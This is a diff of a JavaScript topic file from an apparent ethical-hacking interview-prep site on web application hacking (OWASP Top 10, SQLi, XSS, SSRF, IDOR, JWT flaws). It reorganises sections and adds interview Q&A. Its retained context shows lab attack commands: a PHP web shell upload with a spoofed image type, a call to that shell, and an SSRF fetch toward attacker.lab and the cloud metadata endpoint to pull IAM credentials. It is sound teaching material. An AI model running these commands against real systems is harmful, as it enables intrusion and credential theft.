@@ -1,30 +1,43 @@
 window.PREP_SITE.registerTopic({
-  id: 'eh-web',
-  module: 'eh',
-  title: 'Web Application Hacking',
-  estimatedReadTime: '36 min',
-  tags: ['ethical-hacking', 'security', 'pentest', 'web', 'owasp', 'sqli', 'xss', 'ssrf', 'burp-suite', 'idor'],
+  id: "eh-web",
+  module: "eh",
+  title: "Web Application Hacking",
+  estimatedReadTime: "36 min",
+  tags: ["ethical-hacking","security","pentest","web","owasp","sqli","xss","ssrf","burp-suite","idor"],
   sections: [
 
 // ─────────────────────────────────────────────────────────────
-{ id: 'tldr', title: '🎯 TL;DR', collapsible: false, html: `
-<div class="callout danger">
-  <div class="callout-title">⚠️ Lab-only — read Foundations, Ethics &amp; Legal first if you haven't</div>
-  <p>Every payload, flag, and command in this topic is written to run against <strong>your own deliberately-vulnerable lab targets only</strong> — DVWA, OWASP Juice Shop, Metasploitable, or an in-scope Hack The Box/TryHackMe box — exactly as set up in the module's first topic. Nothing here is aimed at, or should ever be pointed at, a real website you don't own and don't have explicit written authorization to test. Running these techniques against unauthorized systems is a crime regardless of intent (see ⚠️ Defenses &amp; Legal below and the Foundations topic for the full legal picture).</p>
+{ id: "revision", title: "⚡ Revision — Points to Remember", collapsible: false, html: `
+<div class="revision-card">
+  <h4>In one line</h4>
+  <div class="revision-oneline">Web application hacking systematically abuses every trust point a web server can't fully verify — a URL parameter, a POST body, a cookie, a header, an uploaded file's type, or a URL the server itself fetches — mapped by the OWASP Top 10 (2021) and tested through an intercepting proxy.</div>
+  <h4>Key points</h4>
+  <ul>
+    <li><strong>OWASP Top 10 (2021), A01–A10, known by number:</strong> A01 Broken Access Control, A02 Cryptographic Failures, A03 Injection, A04 Insecure Design, A05 Security Misconfiguration, A06 Vulnerable/Outdated Components, A07 Identification &amp; Authentication Failures, A08 Software &amp; Data Integrity Failures, A09 Logging/Monitoring Failures, A10 SSRF.</li>
+    <li><strong>Every web bug is a broken trust boundary, in three families:</strong> input trusted as code (SQLi, command injection, SSTI, XXE, LFI/RFI, XSS), claimed identity trusted (IDOR/BOLA, CSRF, broken session/JWT), and a URL/file trusted without checking where it points (SSRF, insecure file upload).</li>
+    <li><strong>Two mapping facts interviewers probe:</strong> CSRF was folded out of the 2021 list (now discussed under A01, because frameworks defend it by default), and SSRF was promoted to its own category A10 in 2021.</li>
+    <li><strong>Burp Suite maps to the testing loop:</strong> Proxy (see the full surface, including hidden JSON/headers), Repeater (confirm one hypothesis), Intruder (fuzz with wordlists), Decoder, Comparer (diff blind-SQLi/enumeration signals), Scanner (Pro edition only). <strong>OWASP ZAP</strong> is the free intercepting-proxy equivalent.</li>
+    <li><strong>Content discovery comes first:</strong> gobuster/ffuf/feroxbuster/dirb brute-force hidden paths; wpscan/nikto fingerprint known-CVE CMS/server weaknesses — all before manual testing narrows to a parameter.</li>
+    <li><strong>Four SQLi detection techniques:</strong> UNION-based, error-based, blind boolean-based, and blind time-based (SLEEP) — used in rough order of signal strength; sqlmap automates all four (<code>--dbs</code>, <code>--dump</code>, <code>--technique</code>).</li>
+    <li><strong>Three XSS variants:</strong> reflected (echoed in the immediate response, needs a click), stored (saved server-side, fires for every viewer — higher impact), and DOM-based (never touches the server; client-side script reads attacker data like <code>location.hash</code> into a sink like <code>innerHTML</code>).</li>
+    <li><strong>IDOR/BOLA</strong> is one flaw with two names (web Top 10 vs OWASP API Security Top 10, where BOLA is API1:2023 #1): an endpoint returns/modifies an object by client-supplied ID with no per-object authorization check. Test by changing only the ID in Repeater while keeping your own valid token.</li>
+    <li><strong>SSRF's classic high-impact target</strong> is the cloud instance metadata endpoint (<code>169.254.169.254</code>), reachable only from inside the server — chaining an "arbitrary URL fetch" into IAM credential theft is how a Medium becomes a Critical.</li>
+    <li><strong>JWT flaws (A07):</strong> <code>alg:none</code> (verifier trusts the token's own claimed algorithm and skips verification) and a weak HS256 secret cracked offline (<code>jwt_tool -C</code>, <code>hashcat -m 16500</code>), then used to forge any claims.</li>
+    <li><strong>Defenses map one-to-one to bug classes:</strong> parameterized queries (SQLi), context-aware output encoding + strict CSP (XSS), CSRF tokens + SameSite cookies (CSRF), server-side allow-lists — never denylists (SSRF), per-object authorization checks (IDOR).</li>
+    <li><strong>Mantra:</strong> every input is a potential command, every ID is a potential door, and every URL your server fetches on your behalf is a potential weapon — test each one, in scope, with permission. (This is the attacker-side counterpart of the web module's Security (XSS/CSRF/CSP) topic.)</li>
+    <li><strong>The value of manual testing over a scan is chaining</strong> individually-low findings (misconfig + SSRF + metadata) into a full compromise no single step reveals.</li>
+  </ul>
+  <h4>Common trap</h4>
+  <div class="revision-trap">Believing a mitigating control is a fix. A WAF only pattern-matches known payloads and has documented bypasses (encoding, case, comments), and switching sequential IDs to UUIDs only raises the guessing bar — neither replaces the underlying fix (parameterized queries, output encoding, or the missing per-object authorization check). Similarly, a HttpOnly cookie neutralizes one XSS exploitation path but does not fix the XSS itself.</div>
+  <h4>Say this in the interview</h4>
+  <div class="revision-say">"I organize web bugs by which trust boundary the server broke: input trusted as code is the injection family, trusted identity is access-control and auth, and a trusted URL or file to fetch is SSRF and file upload."</div>
+  <div class="revision-say">"For SQLi I confirm manually with one payload to prove the bug class exists — so I actually understand why it works — then hand the parameter to sqlmap for the tedious enumeration; and the real fix is always parameterized queries, not better escaping."</div>
+  <div class="revision-say">"SSRF sounds low-impact until you chain it to the cloud metadata endpoint and pull IAM credentials — that's how an arbitrary-URL-fetch bug becomes a full cloud-account compromise, and why it was promoted to its own A10 category in 2021."</div>
 </div>
-<p><strong>Web Application Hacking</strong> is topic 5 of the Ethical Hacking module: after Foundations, Recon &amp; OSINT, Scanning &amp; Enumeration, and Vulnerability Assessment have found and fingerprinted a target's web stack, this topic is where you actually attack the application layer — the forms, parameters, cookies, headers, file uploads, and APIs that make up nearly every real pentest and bug-bounty engagement's largest slice of findings.</p>
-<ul>
-  <li><strong>The map is the OWASP Top 10 (2021).</strong> Ten ranked categories — from A01 Broken Access Control to A10 Server-Side Request Forgery — that organize almost every vulnerability class covered below. Know the list by number; interviewers ask for it constantly.</li>
-  <li><strong>The core toolkit is an intercepting proxy.</strong> <strong>Burp Suite</strong> (Proxy, Repeater, Intruder, Decoder, Comparer, and — in the paid edition — Scanner) or its free equivalent <strong>OWASP ZAP</strong> sit between your browser and the target, letting you see, replay, and mutate every request the app makes.</li>
-  <li><strong>The big vulnerability families:</strong> injection (SQLi, command injection, SSTI, XXE, LFI/RFI — the server trusts input as code or a path); XSS (the browser trusts injected script as the page's own); CSRF and SSRF (the server trusts the origin or destination of a request); IDOR/BOLA and broken auth/session (JWT `+"`alg:none`"+` or a weak signing secret) (the server trusts a claimed identity); and file upload flaws (the server trusts an uploaded file's declared type).</li>
-  <li><strong>Content discovery comes first.</strong> `+"`gobuster`"+`, `+"`ffuf`"+`, `+"`feroxbuster`"+`, and `+"`dirb`"+` brute-force hidden paths and files; `+"`wpscan`"+` and `+"`nikto`"+` fingerprint known CMS/server weaknesses — all before manual testing narrows in on a specific parameter.</li>
-  <li><strong>This is the offensive counterpart to a topic you may have already read.</strong> The <code>web</code> module's <strong>Security (XSS/CSRF/CSP)</strong> topic covers the same vulnerability classes from the defending developer's side (escaping, CSP, SameSite cookies, DOMPurify). This topic covers attacking them, on purpose, in a lab, with permission.</li>
-</ul>
-<p><strong>Mantra:</strong> "Every input is a potential command, every ID is a potential door, and every URL your server fetches on your behalf is a potential weapon — test each one, in scope, with permission."</p>
-`},
+` },
 
 // ─────────────────────────────────────────────────────────────
-{ id: 'what-why', title: '🧠 What & Why', html: `
+{ id: "what-why", title: "🧠 What & Why", collapsible: true, html: `
 <h3>What "web application hacking" covers</h3>
 <p>Everything a web app's server has to trust that it can't fully verify: the data in a URL parameter, a POST body, a cookie, a header, an uploaded file's declared type, or a URL the app itself will go fetch on the user's behalf. Web application hacking is the discipline of systematically abusing each of those trust points — through a browser, an intercepting proxy, and command-line tools — to prove what an attacker could actually reach: read someone else's data, run arbitrary code on the server, take over an account, or pivot into the internal network the server can see but the internet can't.</p>
 <p>It's consistently the largest attack surface in most real engagements and almost all public bug-bounty programs, because every organization exposes at least one web app to the internet, and a web app is, by definition, built to accept and act on untrusted input.</p>
@@ -38,11 +51,11 @@ window.PREP_SITE.registerTopic({
     <tr><td>A03</td><td>Injection</td><td>Untrusted input is interpreted as code or a query — SQL injection, command injection, SSTI, XSS, LFI/path traversal all live here.</td></tr>
     <tr><td>A04</td><td>Insecure Design</td><td>The flaw is in the design itself, not a coding bug — e.g. no rate limiting on a password-reset flow, business logic that assumes good faith.</td></tr>
     <tr><td>A05</td><td>Security Misconfiguration</td><td>Default credentials, verbose error pages/stack traces, unnecessary features enabled, missing security headers.</td></tr>
-    <tr><td>A06</td><td>Vulnerable and Outdated Components</td><td>A known-CVE library, framework, CMS plugin, or server version — exactly what `+"`wpscan`"+` and version-fingerprinting target.</td></tr>
-    <tr><td>A07</td><td>Identification and Authentication Failures</td><td>Weak session handling, credential stuffing exposure, JWT implementation flaws (`+"`alg:none`"+`, weak HMAC secret).</td></tr>
+    <tr><td>A06</td><td>Vulnerable and Outdated Components</td><td>A known-CVE library, framework, CMS plugin, or server version — exactly what \`wpscan\` and version-fingerprinting target.</td></tr>
+    <tr><td>A07</td><td>Identification and Authentication Failures</td><td>Weak session handling, credential stuffing exposure, JWT implementation flaws (\`alg:none\`, weak HMAC secret).</td></tr>
     <tr><td>A08</td><td>Software and Data Integrity Failures</td><td>Trusting data or code without verifying its integrity — insecure deserialization, unsigned auto-updates, CI/CD pipeline tampering.</td></tr>
     <tr><td>A09</td><td>Security Logging and Monitoring Failures</td><td>Attacks that would otherwise be caught go undetected because nothing is logged or alerted on.</td></tr>
-    <tr><td>A10</td><td>Server-Side Request Forgery (SSRF)</td><td>The server fetches a URL on the attacker's behalf — reaching internal services, cloud metadata endpoints, or `+"`localhost`"+`-only admin panels.</td></tr>
+    <tr><td>A10</td><td>Server-Side Request Forgery (SSRF)</td><td>The server fetches a URL on the attacker's behalf — reaching internal services, cloud metadata endpoints, or \`localhost\`-only admin panels.</td></tr>
   </tbody>
 </table>
 <p>Two mapping notes worth knowing precisely: <strong>CSRF is not its own 2021 category</strong> — it was a standalone item through the 2013/2017 editions but was folded out in 2021 because most modern frameworks now ship CSRF defenses by default; it's still absolutely worth testing for, and is generally discussed alongside A01 Broken Access Control (a successful CSRF forges an authorized-looking request). And <strong>SSRF only became its own category in 2021</strong> (previously it didn't rank top-10 at all) — the community survey that feeds the list ranked it highly enough to promote it to A10, reflecting how common cloud-metadata SSRF chains had become in real breaches.</p>
@@ -62,18 +75,18 @@ window.PREP_SITE.registerTopic({
     <tr><td>IDOR / BOLA</td><td>A01 Broken Access Control</td></tr>
     <tr><td>CSRF</td><td>Folded out in 2021; discussed under A01 Broken Access Control</td></tr>
     <tr><td>SSRF</td><td>A10 Server-Side Request Forgery</td></tr>
-    <tr><td>JWT `+"`alg:none`"+`/weak secret, broken session handling</td><td>A07 Identification and Authentication Failures</td></tr>
+    <tr><td>JWT \`alg:none\`/weak secret, broken session handling</td><td>A07 Identification and Authentication Failures</td></tr>
     <tr><td>Insecure file upload</td><td>A05 Security Misconfiguration (often chains into A03/RCE)</td></tr>
-    <tr><td>Vulnerable CMS/plugin (what `+"`wpscan`"+` finds)</td><td>A06 Vulnerable and Outdated Components</td></tr>
+    <tr><td>Vulnerable CMS/plugin (what \`wpscan\` finds)</td><td>A06 Vulnerable and Outdated Components</td></tr>
   </tbody>
 </table>
 
 <h3>Why this matters: chained low-severity bugs become critical findings</h3>
 <p>The value of manual web app testing over an automated scan is chaining: a content-discovery hit reveals an unauthenticated debug endpoint (A05); that endpoint accepts a URL parameter vulnerable to SSRF (A10) reaching the cloud metadata service; the metadata response hands back IAM credentials; those credentials open the production database. No single step looks critical in isolation — a scanner might rate each one "low" or "medium" — but the chain is a full compromise. This is exactly why a report needs a human tester connecting dots, not just a vulnerability-scanner printout (a distinction also made in the Foundations topic's pentest-vs-vulnerability-assessment discussion).</p>
-`},
+` },
 
 // ─────────────────────────────────────────────────────────────
-{ id: 'mental-model', title: '🗺️ Mental Model', html: `
+{ id: "mental-model", title: "🗺️ Mental Model", collapsible: true, html: `
 <h3>Every web vulnerability is a broken trust boundary</h3>
 <p>Instead of memorizing a flat list of vulnerability names, it helps to group them by <em>what the server wrongly trusted</em>. Nearly everything in this topic falls into one of three trust failures:</p>
 <pre><code class="language-text">1. "I trusted your INPUT as code/a query/a path"     → Injection family
@@ -119,10 +132,10 @@ window.PREP_SITE.registerTopic({
     <tr><td>Scanner</td><td>Automated crawl + active vulnerability scan (Burp Suite Professional only, not Community) — good for coverage, not a substitute for manual chaining</td></tr>
   </tbody>
 </table>
-`},
+` },
 
 // ─────────────────────────────────────────────────────────────
-{ id: 'mechanics', title: '⚙️ Techniques & Tools', html: `
+{ id: "mechanics", title: "⚙️ Techniques & Tools", collapsible: true, html: `
 <h3>Setting up the intercepting proxy</h3>
 <p>Every technique below assumes traffic is flowing through Burp Suite (or OWASP ZAP, its free, actively-maintained alternative with its own Proxy, Spider/crawler, and Active Scan). Route the browser (or a CLI client) through the proxy first:</p>
 <pre><code class="language-bash"># Route curl through Burp's default local proxy so the request also shows
@@ -303,10 +316,10 @@ curl "https://target.lab/uploads/shell.php?cmd=id"
 
 # Spoof Content-Type / magic bytes to pass a "must be an image" check:
 curl -F "file=@shell.php;type=image/jpeg" https://target.lab/upload.php</code></pre>
-`},
+` },
 
 // ─────────────────────────────────────────────────────────────
-{ id: 'examples', title: '🧪 Worked Examples', html: `
+{ id: "examples", title: "🧪 Examples", collapsible: true, html: `
 <h3>Example 1 — Content discovery narrows an entire app down to one form</h3>
 <pre><code class="language-bash"># 1. Brute-force hidden paths first — don't start manually clicking around:
 gobuster dir -u https://juice-shop.lab -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -t 50
@@ -370,10 +383,11 @@ curl "https://target.lab/api/preview?url=http://attacker.lab/canary"
 # → response includes AccessKeyId/SecretAccessKey/Token — usable to call the
 #   cloud provider's API with whatever permissions that role carries</code></pre>
 <p>This is the single most common way an SSRF finding gets rated Critical instead of Medium in a real report: on its own, "the server can be made to fetch an arbitrary URL" sounds low-impact; chained into cloud IAM credential theft, it's a path to the entire cloud account.</p>
-`},
+` },
 
 // ─────────────────────────────────────────────────────────────
-{ id: 'edge-cases', title: '⚠️ Defenses & Legal', html: `
+{ id: "pitfalls", title: "🕳️ Pitfalls", collapsible: true, html: `<div class="pitfalls-part">🕳️ Edge cases</div>
+
 <div class="callout danger">
   <div class="callout-title">⚠️ Authorization reminder</div>
   <p>Everything above is written for, and must stay confined to, systems you own or are explicitly, in-writing authorized to test — your own lab, DVWA/Juice Shop/Metasploitable, or an in-scope Hack The Box/TryHackMe/bug-bounty target. The exact same commands against a system without that authorization are a crime under the CFAA and its international equivalents, regardless of intent, skill, or whether any actual damage occurred — see the Foundations, Ethics &amp; Legal topic for the full legal treatment. If you find something out of scope mid-test, stop touching it and report it — don't "just take a quick look."</p>
@@ -404,10 +418,10 @@ curl "https://target.lab/api/preview?url=http://attacker.lab/canary"
   <li><strong>File upload:</strong> validate the file's actual content (magic bytes/MIME sniffing, not the client-supplied extension or <code>Content-Type</code>), store uploads outside the web root or in non-executable storage, and re-encode/re-generate images rather than trusting the upload as-is.</li>
   <li><strong>LFI/RFI:</strong> never build an include/file path by concatenating user input; validate against a strict allow-list of expected filenames, and disable <code>allow_url_include</code> (PHP) entirely.</li>
 </ul>
-`},
+` },
 
 // ─────────────────────────────────────────────────────────────
-{ id: 'cheat-sheet', title: '📋 Cheat Sheet', html: `
+{ id: "cheat-sheet", title: "📋 Cheat Sheet", collapsible: true, html: `
 <table>
   <thead><tr><th>Category</th><th>Item</th><th>What it means</th></tr></thead>
   <tbody>
@@ -445,10 +459,10 @@ curl "https://target.lab/api/preview?url=http://attacker.lab/canary"
     <tr><td>Cross-link</td><td><code>web-security</code> topic</td><td>Same vulnerability classes, taught from the defending-developer side</td></tr>
   </tbody>
 </table>
-`},
+` },
 
 // ─────────────────────────────────────────────────────────────
-{ id: 'interview-patterns', title: '🎤 Interview Patterns', html: `
+{ id: "interview-qa", title: "🎤 Interview Q&A", collapsible: true, html: `
 <div class="qa-block">
 <div class="qa-q">Walk me through the OWASP Top 10 (2021).</div>
 <div class="qa-a">
@@ -497,50 +511,20 @@ curl "https://target.lab/api/preview?url=http://attacker.lab/canary"
 <p>SQLi: parameterized queries/prepared statements, so user input is always bound as data and never concatenated into SQL syntax. XSS: context-aware output encoding at render time, backed by a strict Content-Security-Policy as a browser-enforced second layer. CSRF: unique per-request CSRF tokens validated server-side, paired with <code>SameSite=Lax</code>/<code>Strict</code> cookies as an independent second layer. SSRF: a strict server-side allow-list of exact permitted destination hosts — never a denylist, since denylists are reliably bypassed via redirects, DNS rebinding, or alternate IP encodings.</p>
 </div>
 </div>
-`},
 
-// ─────────────────────────────────────────────────────────────
-{ id: 'revision', title: '⚡ Revision — Points to Remember', collapsible: true, html: `
-<div class="revision-card">
-  <h4>In one line</h4>
-  <div class="revision-oneline">Web application hacking systematically abuses every trust point a web server can't fully verify — a URL parameter, a POST body, a cookie, a header, an uploaded file's type, or a URL the server itself fetches — mapped by the OWASP Top 10 (2021) and tested through an intercepting proxy.</div>
-  <h4>Key points</h4>
-  <ul>
-    <li><strong>OWASP Top 10 (2021), A01–A10, known by number:</strong> A01 Broken Access Control, A02 Cryptographic Failures, A03 Injection, A04 Insecure Design, A05 Security Misconfiguration, A06 Vulnerable/Outdated Components, A07 Identification &amp; Authentication Failures, A08 Software &amp; Data Integrity Failures, A09 Logging/Monitoring Failures, A10 SSRF.</li>
-    <li><strong>Every web bug is a broken trust boundary, in three families:</strong> input trusted as code (SQLi, command injection, SSTI, XXE, LFI/RFI, XSS), claimed identity trusted (IDOR/BOLA, CSRF, broken session/JWT), and a URL/file trusted without checking where it points (SSRF, insecure file upload).</li>
-    <li><strong>Two mapping facts interviewers probe:</strong> CSRF was folded out of the 2021 list (now discussed under A01, because frameworks defend it by default), and SSRF was promoted to its own category A10 in 2021.</li>
-    <li><strong>Burp Suite maps to the testing loop:</strong> Proxy (see the full surface, including hidden JSON/headers), Repeater (confirm one hypothesis), Intruder (fuzz with wordlists), Decoder, Comparer (diff blind-SQLi/enumeration signals), Scanner (Pro edition only).</li>
-    <li><strong>Content discovery comes first:</strong> gobuster/ffuf/feroxbuster/dirb brute-force hidden paths; wpscan/nikto fingerprint known-CVE CMS/server weaknesses — all before manual testing narrows to a parameter.</li>
-    <li><strong>Four SQLi detection techniques:</strong> UNION-based, error-based, blind boolean-based, and blind time-based (SLEEP) — used in rough order of signal strength; sqlmap automates all four (<code>--dbs</code>, <code>--dump</code>, <code>--technique</code>).</li>
-    <li><strong>Three XSS variants:</strong> reflected (echoed in the immediate response, needs a click), stored (saved server-side, fires for every viewer — higher impact), and DOM-based (never touches the server; client-side script reads attacker data like <code>location.hash</code> into a sink like <code>innerHTML</code>).</li>
-    <li><strong>IDOR/BOLA</strong> is one flaw with two names (web Top 10 vs OWASP API Security Top 10, where BOLA is API1:2023 #1): an endpoint returns/modifies an object by client-supplied ID with no per-object authorization check. Test by changing only the ID in Repeater while keeping your own valid token.</li>
-    <li><strong>SSRF's classic high-impact target</strong> is the cloud instance metadata endpoint (<code>169.254.169.254</code>), reachable only from inside the server — chaining an "arbitrary URL fetch" into IAM credential theft is how a Medium becomes a Critical.</li>
-    <li><strong>JWT flaws (A07):</strong> <code>alg:none</code> (verifier trusts the token's own claimed algorithm and skips verification) and a weak HS256 secret cracked offline (<code>jwt_tool -C</code>, <code>hashcat -m 16500</code>), then used to forge any claims.</li>
-    <li><strong>Defenses map one-to-one to bug classes:</strong> parameterized queries (SQLi), context-aware output encoding + strict CSP (XSS), CSRF tokens + SameSite cookies (CSRF), server-side allow-lists — never denylists (SSRF), per-object authorization checks (IDOR).</li>
-    <li><strong>The value of manual testing over a scan is chaining</strong> individually-low findings (misconfig + SSRF + metadata) into a full compromise no single step reveals.</li>
-  </ul>
-  <h4>Common trap</h4>
-  <div class="revision-trap">Believing a mitigating control is a fix. A WAF only pattern-matches known payloads and has documented bypasses (encoding, case, comments), and switching sequential IDs to UUIDs only raises the guessing bar — neither replaces the underlying fix (parameterized queries, output encoding, or the missing per-object authorization check). Similarly, a HttpOnly cookie neutralizes one XSS exploitation path but does not fix the XSS itself.</div>
-  <h4>Say this in the interview</h4>
-  <div class="revision-say">"I organize web bugs by which trust boundary the server broke: input trusted as code is the injection family, trusted identity is access-control and auth, and a trusted URL or file to fetch is SSRF and file upload."</div>
-  <div class="revision-say">"For SQLi I confirm manually with one payload to prove the bug class exists — so I actually understand why it works — then hand the parameter to sqlmap for the tedious enumeration; and the real fix is always parameterized queries, not better escaping."</div>
-  <div class="revision-say">"SSRF sounds low-impact until you chain it to the cloud metadata endpoint and pull IAM credentials — that's how an arbitrary-URL-fetch bug becomes a full cloud-account compromise, and why it was promoted to its own A10 category in 2021."</div>
+<div class="qa-block">
+  <div class="qa-question">Q8. How would you group SQLi, XSS, IDOR/BOLA, SSRF and insecure file upload by the trust boundary each one breaks?</div>
+  <div class="qa-answer">
+    <p>Group them by what the server wrongly trusted. <strong>Input trusted as code, a query or a path</strong> is the injection family: SQLi and XSS (along with command injection, SSTI, XXE, LFI/RFI). <strong>A claimed identity or cookie trusted</strong> is the access-control and auth family: IDOR/BOLA (plus CSRF and broken session/JWT handling). <strong>A URL or file trusted without checking where it points</strong> is the request/content trust family: SSRF and insecure file upload. When you hit an unfamiliar bug, asking which boundary it breaks tells you which tools and payloads to reach for.</p>
+  </div>
 </div>
-`},
-
-// ─────────────────────────────────────────────────────────────
-{ id: 'checklist', title: '✅ Interview Checklist', collapsible: true, html: `
-<div class="callout success">
-  <div class="callout-title">Can you answer these before moving on?</div>
-  <ul>
-    <li>Can you recite the OWASP Top 10 (2021) by number, and say what changed for CSRF and SSRF in that edition?</li>
-    <li>Can you sort SQLi, XSS, IDOR/BOLA, SSRF, and insecure file upload into the three broken-trust-boundary families?</li>
-    <li>Can you name the four SQL injection detection techniques and explain when you'd fall back to the blind time-based one?</li>
-    <li>Can you explain the difference between reflected, stored, and DOM-based XSS?</li>
-    <li>Can you describe how you'd test an endpoint for IDOR/BOLA using Burp Repeater and your own valid token?</li>
-    <li>Can you give the one-line correct defense for SQLi, XSS, CSRF, and SSRF each — and explain why a WAF is not one of them?</li>
-  </ul>
+<div class="qa-block">
+  <div class="qa-question">Q9. Why isn't a WAF an acceptable fix for an injection or XSS finding?</div>
+  <div class="qa-answer">
+    <p>A Web Application Firewall pattern-matches known payloads in front of the application. It can block opportunistic and automated attacks and buy time, but the vulnerable code is still there, and nearly every WAF has documented bypasses such as encoding tricks, case variation and comment insertion. So it's a mitigating control, not a fix: the report should still require the real remediation (parameterized queries for SQLi, context-aware output encoding plus CSP for XSS) and never accept "we have a WAF" as finished remediation.</p>
+  </div>
 </div>
-`}
+` },
 
-]});
+  ]
+});
